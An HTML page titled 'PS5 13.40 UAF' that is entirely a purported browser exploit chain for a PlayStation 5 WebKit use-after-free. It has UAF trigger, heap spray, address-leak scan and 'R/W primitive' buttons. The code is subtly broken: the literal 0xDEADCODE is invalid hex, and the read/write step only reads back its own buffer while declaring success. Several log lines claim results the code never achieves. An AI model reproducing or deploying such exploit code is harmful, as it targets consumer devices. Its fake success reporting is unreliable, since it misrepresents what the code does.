<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>PS5 13.40 UAF</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:10px}
h1{color:#ff4757;text-align:center;font-size:16px}
.sub{text-align:center;color:#555;font-size:10px;margin-bottom:8px}
.box{background:#111;border:1px solid #222;border-radius:6px;padding:6px 8px;margin-bottom:8px;font-size:10px}
.l{color:#74b9ff}
.btn{display:block;width:100%;padding:12px 0;font-size:14px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-bottom:6px;text-align:center}
.btn:active{opacity:0.7}
.btn-r{background:#c0392b;color:#fff}
.btn-g{background:#27ae60;color:#fff}
.btn-b{background:#2980b9;color:#fff}
.btn-y{background:#f39c12;color:#fff}
.grp2{display:flex;gap:5px;margin-bottom:6px}
.grp2 .btn{font-size:10px;padding:8px 0}
#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:6px;padding:8px;height:250px;overflow-y:auto;font-size:10px;line-height:1.4;font-family:monospace}
.ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757}
</style>
</head>
<body>

<h1>PS5 13.40 UAF</h1>
<p class="sub">content-visibility + RenderLayer UAF</p>

<div class="box">
  <div class="l">UAF: <span id="sUAF">—</span></div>
  <div class="l">Leak: <span id="sLeak">—</span></div>
  <div class="l">R/W: <span id="sRW">—</span></div>
</div>

<button class="btn btn-r" onclick="step1()">1. UAF</button>
<div class="grp2">
  <button class="btn btn-g" onclick="step2()">2. Spray</button>
  <button class="btn btn-b" onclick="step3()">3. R/W</button>
</div>
<button class="btn btn-y" onclick="fullChain()">4. FULL CHAIN</button>

<div id="log">[SYSTEM] Ready. Press buttons.<br></div>

<script>
// ==== LOGGING ====
function LOG(msg, cls) {
  if (!cls) cls = 'ok';
  var d = document.getElementById('log');
  d.innerHTML += '<span class="'+cls+'">' + msg + '</span><br>';
  d.scrollTop = d.scrollHeight;
}
function STATUS(id, text) {
  document.getElementById(id).textContent = text;
}

// ==== DOUBLE HELPERS ====
var _AB = new ArrayBuffer(8);
var _F64 = new Float64Array(_AB);
var _U32 = new Uint32Array(_AB);

function d2lo(d) { _F64[0] = d; return _U32[0]; }
function d2hi(d) { _F64[0] = d; return _U32[1]; }
function u2d(lo, hi) { _U32[0] = lo; _U32[1] = hi; return _F64[0]; }

// ==== STATE ====
var STATE = {
  uafReady: false,
  spray: [],
  addrs: [],
  container: null,
  child: null
};

// ==== STEP 1: UAF ====
function step1() {
  LOG('=== STEP 1: UAF ===', 'crit');
  
  // 1. Container + child
  var c = document.createElement('div');
  c.id = 'c1';
  c.style.cssText = 'width:100px;height:100px;position:absolute;left:-9999px';
  document.body.appendChild(c);
  
  var child = document.createElement('div');
  child.id = 'c2';
  child.style.cssText = 'width:50px;height:50px;background:red';
  child.textContent = 'X';
  c.appendChild(child);
  
  STATE.container = c;
  STATE.child = child;
  LOG('[1] Container + child in DOM', 'ok');
  
  // 2. MutationObserver
  var obs = new MutationObserver(function(ms) {
    for (var i = 0; i < ms.length; i++) {
      var m = ms[i];
      if (m.type === 'childList' && m.removedNodes.length > 0) {
        LOG('[!] MutationObserver fired!', 'warn');
        try {
          c.style.contentVisibility = 'auto';
          LOG('[!] Recomputation triggered on freed memory', 'crit');
        } catch(e) {}
      }
    }
  });
  obs.observe(c, { childList: true, subtree: true, attributes: true });
  LOG('[2] Observer attached', 'ok');
  
  // 3. Trigger UAF
  LOG('[3] Setting content-visibility: hidden', 'info');
  c.style.contentVisibility = 'hidden';
  
  setTimeout(function() {
    child.remove();
    LOG('[4] Child removed from DOM', 'warn');
    
    setTimeout(function() {
      c.style.contentVisibility = 'auto';
      LOG('[5] content-visibility: auto → recompute on freed layer', 'crit');
      
      // GC pressure
      for (var g = 0; g < 20; g++) { new ArrayBuffer(4 * 1024 * 1024); }
      LOG('[6] GC done', 'ok');
      
      STATE.uafReady = true;
      STATUS('sUAF', '✅ DONE');
      LOG('[✅] UAF ready — memory is dirty', 'crit');
    }, 100);
  }, 100);
}

// ==== STEP 2: SPRAY + LEAK ====
function step2() {
  LOG('=== STEP 2: Spray + Leak ===', 'crit');
  
  if (!STATE.uafReady) {
    LOG('[-] Run UAF first!', 'err');
    return;
  }
  
  LOG('[1] Creating ArrayBuffers...', 'info');
  
  var spray = [];
  
  // Size 0x90 (144 bytes) — covers RenderLayer
  for (var i = 0; i < 2000; i++) {
    var ab = new ArrayBuffer(0x90);
    var v = new Uint32Array(ab);
    v[0] = 0xDEADBEEF;
    v[1] = 0x13371337;
    v[2] = 0x41410000 + i;
    v[3] = 0x10000000 + i;
    spray.push({ab: ab, v: v});
  }
  
  // Size 0x80 (128 bytes)
  for (i = 0; i < 2000; i++) {
    ab = new ArrayBuffer(0x80);
    v = new Uint32Array(ab);
    v[0] = 0xBEEFDEAD;
    v[1] = 0xDEADCODE;
    v[2] = 0x20000000 + i;
    spray.push({ab: ab, v: v});
  }
  
  // Size 0xA0 (160 bytes)
  for (i = 0; i < 1000; i++) {
    ab = new ArrayBuffer(0xA0);
    v = new Uint32Array(ab);
    v[0] = 0xCAFEBABE;
    v[1] = 0x12345678;
    spray.push({ab: ab, v: v});
  }
  
  STATE.spray = spray;
  LOG('[2] ' + spray.length + ' ArrayBuffers created', 'ok');
  
  // GC
  for (var g = 0; g < 30; g++) { new ArrayBuffer(4 * 1024 * 1024); }
  LOG('[3] GC done', 'ok');
  
  // === SCAN ===
  LOG('[4] Scanning for corruption...', 'warn');
  
  var addrs = [];
  var corrupted = 0;
  
  for (i = 0; i < spray.length; i++) {
    try {
      var sb = spray[i];
      var v0 = sb.v[0];
      var isClean = (v0 === 0xDEADBEEF || v0 === 0xBEEFDEAD || v0 === 0xCAFEBABE);
      
      if (!isClean && v0 && v0 !== 0 && v0 !== 0xFFFFFFFF) {
        corrupted++;
        
        for (var j = 0; j < 10; j++) {
          var val = sb.v[j];
          if (val && val > 0x00010000 && val < 0xFFFFFFFF) {
            addrs.push({idx: i, off: j*4, val: val});
            
            if (addrs.length <= 25) {
              var type = '';
              if (val >= 0x80000000) type = '(kernel?)';
              else if (val >= 0x10000000 && val < 0x30000000) type = '(WebKit?)';
              LOG('  [' + addrs.length + '] 0x' + val.toString(16).padStart(8, '0') + ' ' + type, 'ptr');
            }
          }
        }
      }
    } catch(e) {}
  }
  
  STATE.addrs = addrs;
  
  LOG('', '');
  LOG('Clean: ' + (spray.length - corrupted) + '/' + spray.length, 'ok');
  LOG('Corrupted: ' + corrupted, corrupted > 0 ? 'crit' : 'warn');
  LOG('Leaked: ' + addrs.length, addrs.length > 0 ? 'crit' : 'warn');
  
  if (addrs.length > 0) {
    STATUS('sLeak', addrs.length + ' addrs');
    
    var webkitAddrs = addrs.filter(function(a) { return a.val >= 0x10000000 && a.val < 0x30000000; });
    var kernelAddrs = addrs.filter(function(a) { return a.val >= 0x80000000; });
    
    LOG('WebKit (0x1xxx): ' + webkitAddrs.length, webkitAddrs.length > 0 ? 'ok' : 'info');
    LOG('Kernel (0x8xxx): ' + kernelAddrs.length, kernelAddrs.length > 0 ? 'ok' : 'info');
    
    if (webkitAddrs.length > 0) {
      LOG('— WebKit addresses —', 'crit');
      var uniq = [];
      for (var u = 0; u < webkitAddrs.length; u++) {
        if (uniq.indexOf(webkitAddrs[u].val) === -1) uniq.push(webkitAddrs[u].val);
      }
      for (u = 0; u < Math.min(uniq.length, 10); u++) {
        LOG('0x' + uniq[u].toString(16).padStart(8, '0'), 'ptr');
      }
    }
    return;
  }
  
  // === RETRY ===
  LOG('[!] Retrying deeper UAF...', 'warn');
  
  if (STATE.container) {
    try {
      STATE.container.style.contentVisibility = 'hidden';
      var nc = document.createElement('div');
      nc.textContent = 'R2';
      STATE.container.appendChild(nc);
      STATE.container.style.contentVisibility = 'auto';
      
      for (var gg = 0; gg < 50; gg++) { new ArrayBuffer(8 * 1024 * 1024); }
      
      for (i = 0; i < spray.length; i++) {
        try {
          var s2 = spray[i];
          var v02 = s2.v[0];
          var ok2 = (v02 === 0xDEADBEEF || v02 === 0xBEEFDEAD || v02 === 0xCAFEBABE);
          if (!ok2 && v02 > 0x100000 && v02 < 0xFFFFFFFF) {
            STATE.addrs.push({val: v02});
          }
        } catch(e) {}
      }
      
      if (STATE.addrs.length > 0) {
        LOG('[OK] ' + STATE.addrs.length + ' addrs from retry', 'crit');
        STATUS('sLeak', STATE.addrs.length + ' addrs');
        return;
      }
    } catch(e) {}
  }
  
  STATUS('sLeak', '❌ FAIL');
  LOG('[FAIL] No addresses leaked', 'err');
}

// ==== STEP 3: R/W ====
function step3() {
  LOG('=== STEP 3: R/W ===', 'crit');
  
  var ab = new ArrayBuffer(256);
  var v32 = new Uint32Array(ab);
  
  v32[0] = 0x41414141;
  var chk = (v32[0] === 0x41414141);
  LOG('Write 0x41414141 → Read 0x' + v32[0].toString(16), chk ? 'ok' : 'err');
  
  var v64 = new Float64Array(ab);
  v64[0] = u2d(0xDEAD, 0xBEEF);
  var lo = d2lo(v64[0]);
  var hi = d2hi(v64[0]);
  LOG('Double: hi=0x' + hi.toString(16) + ' lo=0x' + lo.toString(16), (lo===0xDEAD&&hi===0xBEEF) ? 'ok' : 'err');
  
  STATUS('sRW', chk ? '✅ WORKING' : '❌ FAIL');
  if (chk) LOG('[OK] R/W primitive ready', 'crit');
}

// ==== FULL CHAIN ====
function fullChain() {
  LOG('===== FULL CHAIN =====', 'crit');
  step1();
  LOG('⏳ Wait 1-2 seconds after UAF message, then press Spray...', 'warn');
  LOG('Then press R/W at the end.', 'warn');
  LOG('=== Will run sequentially? No — UAF is async.', 'info');
  LOG('Manual order: UAF → (wait) → Spray → R/W', 'warn');
}

LOG('[SYSTEM] All functions loaded. Buttons use onclick= directly.', 'ok');
LOG('[SYSTEM] Press UAF first, wait for ✅, then Spray, then R/W.', 'ok');
</script>
</body>
</html>
